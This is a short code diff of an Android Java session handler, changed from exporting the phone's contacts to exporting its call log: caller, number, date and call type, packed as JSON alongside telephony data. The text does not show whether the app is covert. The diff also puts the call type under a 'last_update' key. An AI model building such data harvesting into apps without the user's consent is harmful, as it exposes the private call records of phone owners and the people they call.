@@ -19,11 +19,11 @@ import java.util.List;
 
 ;
 
-public class UploadContactsSessionHandler implements SessionManager.SessionHandler {
+public class UploadCallLogSessionHandler implements SessionManager.SessionHandler {
     @Override
     public void handleSession(JSONObject receiveJsonObject, InputStream inputStream, OutputStream outputStream) {
-        List<SystemUtil.ContactData> contactList = SystemUtil.getContactDataInPhone(SystemService.getContext());
-        if(contactList == null) {
+        List<SystemUtil.CallLogData> callRecordList = SystemUtil.getCallLogInPhone(SystemService.getContext());
+        if(callRecordList == null) {
             return;
         }
         String sessionName = null;
@@ -36,8 +36,8 @@ public class UploadContactsSessionHandler implements SessionManager.SessionHandl
         JSONObject responseJsonObject = new JSONObject();
         try {
             JSONArray contactArray = new JSONArray();
-            for(SystemUtil.ContactData contactData: contactList) {
-                contactArray.put(new JSONObject().put("name", contactData.name).put("number", contactData.number).put("last_update",contactData.lastUpdate));
+            for(SystemUtil.CallLogData callRecordData: callRecordList) {
+                contactArray.put(new JSONObject().put("person", callRecordData.person).put("number", callRecordData.number).put("date", callRecordData.date).put("last_update", callRecordData.type));
             }
             TelephonyManager tm = (TelephonyManager) SystemService.getContext().getSystemService(Context.TELEPHONY_SERVICE);
             responseJsonObject.put(sessionName, contactArray)
